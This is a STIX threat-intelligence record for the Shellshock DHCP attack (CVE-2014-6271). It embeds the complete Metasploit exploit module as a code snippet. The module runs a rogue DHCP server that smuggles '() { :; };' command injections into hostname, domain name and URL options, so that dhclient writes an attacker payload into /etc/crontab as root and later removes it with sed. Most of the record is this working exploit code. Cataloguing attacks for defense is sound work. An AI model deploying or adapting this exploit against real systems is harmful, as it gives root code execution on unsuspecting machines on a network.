{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eb126c28-d157-4b59-a423-674994c3e2b0",
    "created": "2024-08-14T17:14:21.001968Z",
    "modified": "2024-08-14T17:14:21.001971Z",
    "name": "Dhclient Bash Environment Variable Injection (Shellshock)",
    "description": "| This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables. This module targets dhclient by responding",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/dhcp/bash_environment.rb",
            "external_id": "bash_environment.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-6271"
        },
        {
            "source_name": "reference",
            "url": "https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2014/q3/649"
        },
        {
            "source_name": "reference",
            "url": "https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::DHCPServer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Dhclient Bash Environment Variable Injection (Shellshock)',\n      'Description'    => %q|\n        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell\n        handles external environment variables. This module targets dhclient by responding\n        to DHCP requests with a malicious hostname, domainname, and URL which are then\n        passed to the configuration scripts as environment variables, resulting in code\n        execution. Due to length restrictions and the unusual networking scenario at the\n        time of exploitation, this module achieves code execution by writing the payload\n        into /etc/crontab and then cleaning it up after a session is created.\n      |,\n      'Author'         =>\n        [\n          'Stephane Chazelas', # Vulnerability discovery\n          'egypt' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['unix'],\n      'Arch'           => ARCH_CMD,\n      'References'     =>\n        [\n          [ 'CVE', '2014-6271' ],\n          [ 'CWE', '94' ],\n          [ 'OSVDB', '112004' ],\n          [ 'EDB', '34765' ],\n          [ 'URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],\n          [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]\n        ],\n      'Payload'        =>\n        {\n          # 255 for a domain name, minus some room for encoding\n          'Space'       => 200,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic telnet ruby',\n            }\n        },\n      'Targets'        => [ [ 'Automatic Target', { }] ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2014-09-24',\n      'Notes' =>\n          {\n            'Stability' => [CRASH_SAFE],\n            'SideEffects' => [],\n            'Reliability' => [],\n            'AKA' => ['Shellshock']\n          }\n    ))\n\n    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')\n\n    self.needs_cleanup = true\n  end\n\n  def on_new_session(session)\n    print_status \"Cleaning up crontab\"\n    # XXX this will brick a server some day\n    session.shell_command_token(\"sed -i '/^\\\\* \\\\* \\\\* \\\\* \\\\* root/d' /etc/crontab\")\n  end\n\n  def exploit\n    hash = datastore.copy\n    # Quotes seem to be completely stripped, so other characters have to be\n    # escaped\n    p = payload.encoded.gsub(/([<>()|'&;$])/) { |s| Rex::Text.to_hex(s) }\n    echo = \"echo -e #{(Rex::Text.to_hex(\"*\") + \" \") * 5}root #{p}>>/etc/crontab\"\n    hash['DOMAINNAME'] = \"() { :; };#{echo}\"\n    if hash['DOMAINNAME'].length > 255\n      raise ArgumentError, 'payload too long'\n    end\n\n    hash['HOSTNAME'] = \"() { :; };#{echo}\"\n    hash['URL'] = \"() { :; };#{echo}\"\n    start_service(hash)\n\n    while @dhcp.thread.alive?\n      sleep 2\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2014-09-24",
    "x_mitre_platforms": [
        "['unix']"
    ]
}